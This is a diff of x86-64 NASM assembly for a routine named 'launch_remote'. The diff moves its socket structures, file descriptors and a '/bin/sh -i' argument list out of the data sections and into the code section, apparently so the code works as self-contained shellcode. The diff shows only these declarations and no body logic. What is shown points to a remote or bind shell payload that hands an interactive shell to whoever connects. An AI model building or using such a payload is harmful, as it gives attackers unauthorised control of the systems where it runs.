@@ -1,6 +1,7 @@
 BITS 64
 
-section .data
+section .text
+    global launch_remote
     extern  shell_port
     global client_fd
     global sock_fd
@@ -16,28 +17,6 @@ section .data
     global caddr
     global czero
     global clen
-    client_fd   dd 0
-    sock_fd     dd 0
-    serv:
-        family      dw 0
-        port        dw 0
-        addr        dd 0
-        zero        dq 0
-        servlen     equ $ - serv
-    client:
-        cfamily      dw 0
-        cport        dw 0
-        caddr        dd 0
-        czero        dq 0
-        clen         dd 0 
-
-section .rodata
-    sh: db "/bin/sh", 0
-    i: db "-i", 0
-    args: dq sh, i, 0
-
-section .text
-    global launch_remote
 
 launch_remote:
     push    rbp
@@ -134,3 +113,21 @@ exit:
     syscall
     leave
     ret
+
+    client_fd   dd 0
+    sock_fd     dd 0
+    serv:
+        family      dw 0
+        port        dw 0
+        addr        dd 0
+        zero        dq 0
+        servlen     equ $ - serv
+    client:
+        cfamily      dw 0
+        cport        dw 0
+        caddr        dd 0
+        czero        dq 0
+        clen         dd 0 
+    sh: db "/bin/sh", 0
+    i: db "-i", 0
+    args: dq sh, i, 0
